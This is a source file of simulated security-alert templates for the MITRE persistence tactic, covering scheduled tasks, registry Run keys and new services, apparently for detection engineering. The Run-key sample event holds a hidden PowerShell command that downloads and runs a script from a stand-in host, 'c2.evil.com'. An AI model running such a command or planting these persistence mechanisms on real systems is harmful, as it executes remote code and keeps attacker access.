/**
 * Persistence Event Templates (MITRE Tactic: Persistence - TA0003)
 */

export const persistenceTemplates = [
  {
    templateId: "PERSIST_SCHEDULED_TASK_01",
    name: "Suspicious Scheduled Task Creation",
    source: "WindowsEventLog",
    provider: "Microsoft",
    product: "Windows Security Log",
    category: "persistence",
    severity: "medium",
    confidence: 85,
    mitreTechnique: {
      id: "T1053.005",
      name: "Scheduled Task",
      tactic: "Persistence"
    },
    detectionRule: {
      ruleId: "RULE-SCHTASK-NEW",
      ruleName: "Scheduled Task Created in Public/Temp Directory",
      mitreId: "T1053.005",
      threshold: "schtasks.exe /create pointing to C:\\Users\\Public or C:\\Windows\\Temp",
      confidence: 85,
      ruleVersion: "1.4",
      author: "ExplainSec Detection Engineering"
    },
    description: "New scheduled task created executing payload stored in non-standard public directory",
    rawEvent: JSON.stringify({
      EventID: 4698,
      TaskName: "\\Microsoft\\Windows\\UpdateChecker",
      TaskContent: "<Command>C:\\Users\\Public\\updater.exe</Command>"
    })
  },
  {
    templateId: "PERSIST_REG_RUNKEY_01",
    name: "Registry Run Key Modification",
    source: "DefenderForEndpoint",
    provider: "Microsoft",
    product: "Defender EDR",
    category: "persistence",
    severity: "medium",
    confidence: 80,
    mitreTechnique: {
      id: "T1547.001",
      name: "Registry Run Keys / Startup Folder",
      tactic: "Persistence"
    },
    detectionRule: {
      ruleId: "RULE-REG-RUNKEY-01",
      ruleName: "Autorun Key Added to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      mitreId: "T1547.001",
      threshold: "Registry key value modification in Run path",
      confidence: 80,
      ruleVersion: "1.1",
      author: "ExplainSec Detection Engineering"
    },
    description: "Persistence registry key added under CurrentVersion\\Run for automatic logon execution",
    rawEvent: JSON.stringify({
      RegistryKey: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      ValueName: "WindowsUpdateAgent",
      ValueData: "powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.com/s')\""
    })
  },
  {
    templateId: "PERSIST_SERVICE_NEW_01",
    name: "New Windows Service Installation",
    source: "WindowsEventLog",
    provider: "Microsoft",
    product: "System Event Log",
    category: "persistence",
    severity: "high",
    confidence: 88,
    mitreTechnique: {
      id: "T1543.003",
      name: "Windows Service",
      tactic: "Persistence"
    },
    detectionRule: {
      ruleId: "RULE-SERVICE-NEW-01",
      ruleName: "System Service Installed Executing Unsigned Binary",
      mitreId: "T1543.003",
      threshold: "Event 7045 with binary in Temp directory",
      confidence: 88,
      ruleVersion: "2.0",
      author: "ExplainSec Threat Intel"
    },
    description: "System service installed configured to start automatically under SYSTEM privileges",
    rawEvent: JSON.stringify({
      EventID: 7045,
      ServiceName: "PSEXESVC",
      ImagePath: "%SystemRoot%\\PSEXESVC.exe",
      ServiceType: "user instance service",
      StartType: "demand start"
    })
  }
];
